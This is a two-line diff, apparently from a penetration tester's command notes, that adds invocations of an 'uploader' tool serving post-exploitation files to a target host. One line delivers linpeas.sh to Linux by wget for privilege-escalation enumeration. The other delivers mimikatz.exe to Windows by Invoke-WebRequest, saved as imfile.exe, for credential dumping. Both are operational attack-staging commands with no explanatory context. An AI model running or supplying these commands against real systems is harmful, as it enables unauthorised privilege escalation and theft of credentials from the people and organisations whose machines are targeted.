@@ -1,0 +1,2 @@
+uploader --port 8081 -f /opt/resources/linux/linPEAS/linpeas.sh --os linux -p 8080 --payload Wget
+uploader --port 8081 -f /opt/resources/windows/mimikatz/x64/mimikatz.exe --os windows -p 8080 --payload Iwr -o imfile.exe
